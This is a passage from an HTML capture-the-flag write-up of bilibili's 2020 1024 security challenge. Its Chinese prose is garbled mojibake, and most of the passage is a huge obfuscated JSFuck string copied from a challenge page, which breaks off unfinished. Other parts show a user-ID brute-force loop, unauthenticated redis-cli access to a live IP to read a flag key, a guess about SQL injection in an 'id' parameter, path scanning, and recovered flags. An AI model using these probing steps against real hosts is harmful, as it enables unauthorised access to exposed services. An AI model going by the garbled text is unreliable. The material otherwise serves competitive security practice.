punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        uid <span class="token operator">=</span> uid<span class="token operator">-</span><span class="token number">1</span></code></pre><p>æœ€åå‘ç° uid æ˜¯ 100336917ï¼Œåç§»é‡å°± 28â€¦</p><p><code>6d917dff-eb085a50-58b6513f-5c0c3248</code></p><p>æˆ–è€… Burp Suite ä¹Ÿè¡Œã€‚</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201024181117648.png" alt="flag5"></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>ç»“æŸäº¦æ˜¯å¼€å§‹</p><p><a href="http://45.113.201.36/blog/single.php?id=1">http://45.113.201.36/blog/single.php?id=1</a></p><p>æ˜¯ä¸ªå¥‡æ€ªçš„åšå®¢é¡µé¢ã€‚</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201026012113816.png" alt="6"></p><p>ä¸Šé¢ä¸€è¡Œå¯¼èˆªæ éƒ½ 404ï¼Œæ„Ÿè§‰ä¸Šåº”è¯¥æ˜¯ <code>id</code> å‚æ•°çš„æ³¨å…¥ï¼Ÿ</p><p>æ²¡ææ‡‚ï¼ˆ</p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>æ¥ä¸‹æ¥çš„æ—…ç¨‹ï¼Œéœ€è¦å°‘å¹´è‡ªå·±å»æ¢ç´¢å•¦ï½</p><p><strong>ï¼ˆç›²çŒœå°±ç¦»è°±</strong></p><p>æœªçŸ¥ã€‚</p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>6379 Redis ç«¯å£</p><pre class="language-bash" data-language="bash"><code class="language-bash">redis-cli.exe -h <span class="token number">45.113</span>.201.36<span class="token number">45.113</span>.201.36:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> get flag8<span class="token string">"d436b982-2b81aa54-49a8d2db-87ab951a"</span></code></pre><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201026003804481.png" alt="flag8"></p><blockquote><p>ä»¥åŠï¼Œè¢«æ… shi äº†ï¼Ÿ</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201026004204074.png" alt="å–µå–µå–µï¼Ÿ"></p></blockquote><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><p>æœªçŸ¥ã€‚</p><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><p>è·¯å¾„ç›²çŒœï¼ˆå°±ç‹‚æ‰«å‘—</p><p><a href="http://45.113.201.36/blog/test.php">http://45.113.201.36/blog/test.php</a></p><pre class="language-none"><code class="language-none">[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+(+{}+[])[+!![]]+(!![]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+{}+[])[+!![]]+(+[]+[])+([]+{})[!+[]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]